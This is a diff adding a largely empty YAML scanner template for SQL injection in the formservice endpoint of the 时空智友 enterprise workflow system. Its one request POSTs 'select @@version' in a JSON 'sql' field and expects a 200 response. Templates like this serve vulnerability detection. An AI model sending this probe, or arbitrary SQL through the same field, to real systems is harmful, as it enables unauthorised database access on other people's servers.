@@ -1,0 +1,20 @@
+id:
+info:
+  name: 时空智友企业流程化管控系统formservice存在SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /formservice?service=workflow.sqlResult
+  headers:
+    Content-Type: application/json
+  data: |
+    {"params":{"a":"11"},"sql":"select @@version"}
+response1:
+  headers:
+  body: SQL
+  code: 200
+requests2:
+response2:
